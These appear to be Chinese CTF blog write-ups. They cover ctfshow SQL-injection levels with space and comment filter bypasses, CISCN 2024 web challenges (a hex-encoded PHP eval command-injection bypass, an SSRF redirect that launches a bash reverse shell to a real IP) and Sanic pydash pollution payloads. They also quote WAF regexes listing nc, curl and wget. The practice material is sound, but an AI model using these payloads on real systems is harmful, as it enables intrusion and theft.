<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; Union Select 1,password,3 from ctfshow_user --+</span><br></pre></td></tr></table></figure>

<p>ctfshow{939338e1-d47c-461b-bc76-f4e60435ae80}</p>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<p>过滤空格 而且 –+，#应该也过滤了</p>
<p>&#x2F;**&#x2F; %23</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>依旧可行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<p>增加了<code>/**/</code>的过滤</p>
<p>可以这些绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回车(%0a) `(tab键上面的按钮)(%09) tab 和  %0b %0c %0d %a0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%0aunion%0aselect%0a1,password,3%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,password,3%09from%09ctfshow_user%23</span><br></pre></td></tr></table></figure>

<p>ctfshow{a2e33152-7f53-4000-b89b-972b5fc739a2}</p>
<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0c可以用</span><br><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>还是过滤空格 只不过这次加了对 <code>#</code>(<code>%23</code>) 的过滤</p>
<p>万能密码依旧能打</p>
<p>只不过需要</p>
<p>这里使用 <code>--</code>(–后加个空格) 绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user--%0c</span><br></pre></td></tr></table></figure>

<p>ctfshow{94f1ba08-b230-4dda-9a6a-eeaac94caef2}</p>
<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>继续造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>sql刷题笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Ciscn2024web复现</title>
    <url>/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**：设置 <code>open_basedir</code> 配置选项，限制 PHP 只能访问 <code>/var/www/html/</code> 目录及其子目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><code>**escapeshellcmd**</code> 是一个 PHP 内置函数，用于转义传递给 shell 的字符串，以防止命令注入攻击。它的主要作用是确保用户输入的字符串在作为 shell 命令的一部分执行时不会被解释为特殊字符或命令。这个函数会在某些有特殊含义的字符前添加反斜杠，从而使这些字符失去特殊含义。</p>
<p>eg:</p>
<p>假设有以下用户输入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>使用 <code>escapeshellcmd</code> 转义后：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure>

<p>输出将会是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure>

<p>而且这里过滤了很多东西</p>
<p>跟着wp复现</p>
<p><code>php -r</code> 是 PHP 命令行界面（CLI）的一部分，它允许你直接在命令行中运行 PHP 代码，而无需创建一个文件来包含这些代码。<code>-r</code> 选项用于指定一段将被执行的 PHP 代码</p>
<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p>
<p>发现可以直接执行</p>
<p>那么我们这就可以命令执行</p>
<p>由于绕过的函数有些多，我们可以使用hex2bin()函数进行16进制转字符进行绕过</p>
<p>但发现直接<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p>
<p>行不通</p>
<p>发现hex2bin需要的参数是一个字符串类型的数字，直接两个双引号呢？</p>
<p>不行 gg 准备跑路</p>
<p>但是总有大佬能想出来</p>
<p><strong>substr()</strong> 这个就有点牛逼了</p>
<p>我们知道</p>
<p><strong>自动类型转换（Type Juggling）</strong></p>
<p>PHP 是一种弱类型语言，它支持自动类型转换，称为“类型杂耍”（type juggling）。这意味着 PHP 会在需要时自动将一种数据类型转换为另一种数据类型。这种转换在函数参数传递时特别常见。</p>
<p>当你传递一个数字给 <code>substr()</code> 的 <code>$string</code> 参数时，PHP 会自动将这个数字转换为字符串。这是因为 <code>substr()</code> 函数的<strong>第一个参数需要一个字符串</strong>，而 PHP 会尝试将传递的任何数据转换为期望的类型。</p>
<p>所以我们这里payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure>

<p>成功执行 </p>
<p>查找&#x2F;目录发现没东西 但是 ps 发现有sql进程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p>
<p>爆出库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p>
<p>还有个更简单的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure>

<p>直接把所有库的所有数据查出来 然后找flag</p>
<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:简单的cms，可以扫扫看？ 提示1： &#x2F;flag.php： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示2：github找一下源码?</p>
<p>找到源码</p>
<p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
<p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p>
<p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p>
<p>ssrf漏洞</p>
<p>定位这个函数<strong>dr_catcher_data</strong></p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p>
<p>试了下输入本地不行</p>
<p>302跳转</p>
<p>自己vps上面构建302.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=6666&amp;level=1</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p>
<p>卡了？ 试了几次都这样 </p>
<p>gg 跑路 复现失败 ┭┮﹏┭┮</p>
<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>依旧是这位大佬gxngxngxn</p>
<p>参考</p>
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
<p>进入src路由</p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>分析下这段 在&#x2F;login路由处我们需要绕过**user.lower() &#x3D;&#x3D; ‘adm;n’**的限制，由于这里是从session中读取，所以默认是会在分号处截断，直接传肯定是不行的</p>
<p>利用八进制绕过</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B926%E5%88%86.png" alt="image-20240801202640883"></p>
<p>原理之前DASCTF复现的时候讲过了</p>
<p>所以直接上操作</p>
<p>得到admin的session</p>
<p>进入admin</p>
<p>直接污染</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>得到flag名</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B908%E5%88%86.png" alt="image-20240801210841152"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问src 拿flag</p>
<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B910%E5%88%86.png" alt="image-20240801211003726"></p>
<h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2>]]></content>
      <categories>
        <category>ciscn</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Sanic&#39;s revenge(复现)</title>
    <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>复现这个之前先要学习下python的原型链污染（未学┭┮﹏┭┮）</p>
<p>之前学了Nodejs原型链污染，Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
<p>先看给的源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html  </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">import</span> pydash  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydash==5.1.2  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)  </span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):  </span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span>  </span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):  </span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):  </span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]  </span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]  </span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:  </span><br><span class="line">        pollute = Pollute()  </span><br><span class="line">        pydash.set_(pollute, key, value)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)  </span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span>  </span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span>  </span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span>  </span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);  </span><br><span class="line">        <span class="comment"># 生成日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="comment"># 备份日志文件  </span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)  </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">            f.write(log)  </span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们看到Pollute 路由这段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>这是一个处理 <code>/pollute</code> 路径的异步函数 <code>POLLUTE</code>，支持 <code>GET</code> 和 <code>POST</code> 方法。</li>
<li>解析请求的 JSON 数据，获取 <code>key</code> 和 <code>value</code>。</li>
<li>如果条件满足：<ul>
<li>创建一个 <code>Pollute</code> 实例。</li>
<li>使用 <code>pydash.set_</code> 函数 设置 <code>pollute</code> 实例的属性。</li>
<li>返回 “success” 文本。</li>
</ul>
</li>
<li>这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入&#x2F;tmp目录下的文件中</li>
</ul>
<p>payload:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

